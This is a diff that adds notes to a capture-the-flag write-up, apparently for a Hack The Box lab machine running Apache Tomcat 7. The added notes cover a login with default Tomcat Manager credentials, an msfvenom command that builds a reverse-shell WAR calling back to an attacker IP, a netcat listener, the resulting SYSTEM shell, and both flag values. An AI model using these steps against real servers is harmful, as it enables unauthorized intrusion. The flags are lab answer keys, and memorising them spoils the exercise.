@@ -27,4 +27,47 @@ access to `http://jerry.htb:8080`
 apache tomcat 7.0.88 shows up
 ![[Pasted image 20230213152928.png]]
 
+There is a login prompt in Manater App
 
+### Trying default password
+https://github.com/netbiosX/Default-Credentials/blob/master/Apache-Tomcat-Default-Passwords.mdown
+
+tomcat:s3cret
+
+### Upload file
+![[Pasted image 20230214092623.png]]
+
+WAR file can be uploaded?
+
+
+# Foothold
+
+## Create reverse shell
+
+### msfvenom
+```
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.2 LPORT=4444 -f war > revshell.war
+```
+
+## Get shell
+
+- Upload this revshell file in Tomcat
+- Setup nc `nc -lnvp 4444 `
+- Click on the /revshell
+
+```
+C:\apache-tomcat-7.0.88>whoami
+whoami
+nt authority\system
+```
+
+## Get flags
+```
+C:\Users\Administrator\Desktop\flags>type "2 for the price of 1.txt"
+type "2 for the price of 1.txt"
+user.txt
+7004dbcef0f854e0fb401875f26ebd00
+
+root.txt
+04a8b36e1545a455393d067e772fe90e
+```
